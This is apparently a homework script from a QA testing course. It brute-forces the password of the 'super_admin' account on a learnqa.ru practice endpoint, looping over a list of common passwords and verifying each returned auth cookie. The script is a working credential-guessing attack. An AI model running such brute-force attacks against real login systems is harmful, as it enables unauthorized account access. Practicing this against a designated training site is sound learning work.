import requests
import json

# Необходимый URL
url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_cookie_url = 'https://playground.learnqa.ru/api/check_auth_cookie'

passwords_list = [
    '123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111', '123123',
    'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely', '7777777', 'welcome',
    '888888', 'princess', 'dragon', 'password1', '123qwe'
]

i = 0

while i <= 25:
    payload = {'login': 'super_admin', 'password': passwords_list[i]}
    r = requests.post(url=url, data=payload)
    json_text = r.cookies
    auth_cookie = json_text["auth_cookie"]
    cookies = dict(auth_cookie=auth_cookie)
    print("Полученные Cookie: ", auth_cookie)
    payload_2 = {'login': 'super_admin', 'password': passwords_list[i]}
    r = requests.get(url=check_cookie_url, params=payload_2, cookies=cookies)
    auth_text = r.text
    print("Попытка номер", i, auth_text, "Пароль: ", passwords_list[i])
    if auth_text != "You are NOT authorized":
        print("Верный пароль: ", passwords_list[i])
        break
    i = i+1
    if i == 25:
        print("Приехали")
        break
